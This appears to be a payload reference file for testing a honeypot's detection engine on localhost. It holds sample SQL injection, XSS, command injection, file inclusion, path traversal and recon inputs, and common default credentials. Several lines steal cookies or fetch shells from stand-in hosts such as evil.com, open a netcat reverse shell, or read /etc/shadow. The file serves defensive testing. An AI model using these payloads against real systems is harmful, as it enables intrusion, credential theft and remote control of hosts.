# CyberSentinel Honeypot — Attack Test Payloads
# Educational reference for testing the detection engine.
# Use the Manual Injection Lab at /simulate/ to submit these.

---

## SQL Injection (10 payloads)

```
' OR '1'='1' --
admin' OR '1'='1
' UNION SELECT username,password FROM users --
'; DROP TABLE users; --
' OR 1=1 --
admin'--
' OR SLEEP(5) --
1' AND 1=1 --
' OR ''='
1; SELECT * FROM information_schema.tables --
```

---

## XSS — Cross-Site Scripting (10 payloads)

```
<script>alert('XSS')</script>
<img src=x onerror=alert(1)>
<svg onload=alert('XSS')>
javascript:alert(document.cookie)
<iframe src=javascript:alert(1)>
<body onload=alert('XSS')>
<input onfocus=alert(1) autofocus>
<a href=javascript:alert(1)>click</a>
"><script>alert(String.fromCharCode(88,83,83))</script>
<script>document.location='http://evil.com/c='+document.cookie</script>
```

---

## Brute Force (10 credential pairs)

```
admin / password
admin / 123456
root / root
admin / admin123
admin / qwerty
user / letmein
administrator / welcome
guest / guest
test / test123
admin / P@ssw0rd
```

---

## Command Injection (10 payloads)

```
; whoami
| cat /etc/passwd
&& uname -a
`id`
$(cat /etc/shadow)
; netstat -an
|| ls -la /root
; wget http://evil.com/shell.sh
; nc -e /bin/sh 127.0.0.1 4444
; curl evil.com | sh
```

---

## LFI — Local File Inclusion (10 payloads)

```
php://filter/convert.base64-encode/resource=index
php://input
file:///etc/passwd
expect://id
zip://shell.zip#payload.php
phar://archive.phar/payload.txt
data://text/plain;base64,PD9waHAgc3lzdGVtKCJpZCIpOyA/Pg==
/var/log/auth.log
php://filter/read=convert.base64-encode/resource=/etc/passwd
file:///proc/self/cmdline
```

---

## RFI — Remote File Inclusion (10 payloads)

```
http://evil.example.com/shell.php
https://attacker.com/payload.txt
ftp://evil.com/backdoor.php
http://192.168.1.100/c.php
https://raw.githubusercontent.com/x/y/main/shell.php
http://pastebin.com/raw/abc123.php
http://10.0.0.1/cmd.php
https://127.0.0.1:8080/x.py
http://evil.tk/r.pl
http://attacker.onion/shell.php
```

---

## Directory / Path Traversal (10 payloads)

```
../../../../etc/passwd
..\..\..\..\windows\system32\drivers\etc\hosts
../../../../etc/shadow
%2e%2e/%2e%2e/%2e%2e/etc/passwd
..%2f..%2f..%2fetc%2fpasswd
/proc/self/environ
../../../../var/log/apache2/access.log
C:\Windows\win.ini
....//....//etc/passwd
/etc/hosts
```

---

## Scanner / Recon (10 payloads)

```
sqlmap
nikto
nmap -sV
/wp-login.php
/phpmyadmin
/.git/config
/.env
dirbuster
gobuster dir -u http://127.0.0.1:8000 -w /usr/share/wordlists/common.txt
masscan -p1-65535 127.0.0.1
```

---

## How to use

### Option A — Manual Injection Lab
1. Open http://127.0.0.1:8000/simulate/
2. Paste any payload into the **Manual Injection Lab** textarea
3. Click **Launch Payload** — animated replay fires against the honeypot login

### Option B — Direct curl
```bash
curl -X POST http://127.0.0.1:8000/login/ \
  --data "username=admin' OR '1'='1' --&password=x" \
  -H "User-Agent: sqlmap/1.7"
```

### Option C — Auto Simulator
Select attack type from dropdown at /simulate/ → Execute Simulation
